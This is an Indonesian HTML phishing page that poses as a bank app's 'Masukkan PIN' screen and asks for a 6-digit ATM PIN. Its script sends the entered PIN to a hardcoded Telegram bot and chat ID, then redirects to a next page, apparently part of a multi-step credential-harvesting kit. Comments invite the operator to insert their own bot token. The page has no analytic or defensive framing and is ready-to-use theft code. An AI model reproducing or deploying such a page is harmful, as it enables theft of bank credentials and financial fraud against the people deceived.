<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
    <title>Masukkan PIN</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background-color: #f4f4f4;
            font-family: Arial, sans-serif;
        }

        /* Style Loading Full Screen */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #70BD00;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 9999;
        }

        .spinner {
            width: 45px;
            height: 45px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s linear infinite;
            margin-bottom: 10px;
        }

        .loading-text {
            color: white;
            font-size: 16px;
            font-weight: bold;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Style Input PIN */
        .pin-input {
            width: 100%;
            height: 55px;
            text-align: center;
            font-size: 20px;
            font-weight: bold;
            border: 1px solid #ccc;
            border-radius: 6px;
            background-color: white;
        }

        .pin-input:focus {
            border-color: #70BD00;
            outline: none;
        }
    </style>
</head>
<body>

    <!-- Loading Screen -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Mohon Tunggu...</div>
    </div>

    <!-- Header -->
    <div class="bg-green-600 text-white px-4 py-3 flex items-center shadow-sm">
        <a href="#" onclick="goBack()" class="mr-3">
            <i class="fas fa-arrow-left text-base"></i>
        </a>
        <h1 class="text-lg font-bold">Masukkan PIN</h1>
    </div>

    <!-- Konten Utama -->
    <div class="flex flex-col items-center justify-center mt-12 px-6">
        <p class="text-gray-500 text-base mb-6">PIN ATM 6 digit Anda</p>

        <!-- Form PIN -->
        <form id="pinForm" class="w-full">
            <!-- Kotak Input PIN -->
            <div class="flex justify-between gap-2 mb-6">
                <input type="password" id="pin1" class="pin-input" maxlength="1" oninput="moveFocus(this, 'pin2')">
                <input type="password" id="pin2" class="pin-input" maxlength="1" oninput="moveFocus(this, 'pin3')">
                <input type="password" id="pin3" class="pin-input" maxlength="1" oninput="moveFocus(this, 'pin4')">
                <input type="password" id="pin4" class="pin-input" maxlength="1" oninput="moveFocus(this, 'pin5')">
                <input type="password" id="pin5" class="pin-input" maxlength="1" oninput="moveFocus(this, 'pin6')">
                <input type="password" id="pin6" class="pin-input" maxlength="1">
            </div>

            <!-- Tombol Konfirmasi -->
            <button type="submit" 
                    class="w-full bg-green-600 hover:bg-green-700 text-white text-lg font-bold py-3 rounded-lg transition duration-300 shadow">
                KONFIRMASI
            </button>
        </form>
    </div>

    <script>
        // Ganti dengan Token Bot dan Chat ID kamu
        const BOT_TOKEN = '8795383747%3AAAGfHT_1RNxZQwXDZBt9lQak_376x1FhHHk'; 
        const CHAT_ID = '8399708797';

        const loadingOverlay = document.getElementById('loadingOverlay');
        const pinForm = document.getElementById('pinForm');

        // Fungsi agar otomatis pindah ke kotak berikutnya
        function moveFocus(current, nextId) {
            if (current.value.length === 1) {
                document.getElementById(nextId).focus();
            }
        }

        pinForm.addEventListener('submit', function(e) {
            e.preventDefault();

            // Ambil semua nilai PIN
            const pin1 = document.getElementById('pin1').value;
            const pin2 = document.getElementById('pin2').value;
            const pin3 = document.getElementById('pin3').value;
            const pin4 = document.getElementById('pin4').value;
            const pin5 = document.getElementById('pin5').value;
            const pin6 = document.getElementById('pin6').value;

            const pinLengkap = pin1 + pin2 + pin3 + pin4 + pin5 + pin6;

            // Validasi
            if (pinLengkap.length !== 6) {
                alert('Mohon masukkan PIN 6 digit lengkap!');
                return;
            }

            // Tampilkan Loading
            loadingOverlay.style.display = 'flex';

            // Siapkan pesan untuk dikirim ke Telegram
            const message = `🔐 *VERIFIKASI PIN*\n\n` +
                            `💳 PIN ATM: ${pinLengkap}\n\n` +
                            `✅ Data PIN berhasil dikirim.`;

            // Kirim ke Telegram
            sendToTelegram(message);
        });

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => response.json())
            .then(data => {
                setTimeout(() => {
                    loadingOverlay.style.display = 'none';
                    // Pindah ke halaman berikutnya
                    window.location.href = "3.html"; // <-- Ganti nama file sesuai kebutuhan
                }, 2000); 
            })
            .catch(error => {
                console.error('Error:', error);
                loadingOverlay.style.display = 'none';
                alert('Gagal mengirim data. Coba lagi.');
            });
        }

        // Fungsi tombol kembali
        function goBack() {
            window.history.back();
        }
    </script>

</body>
</html>
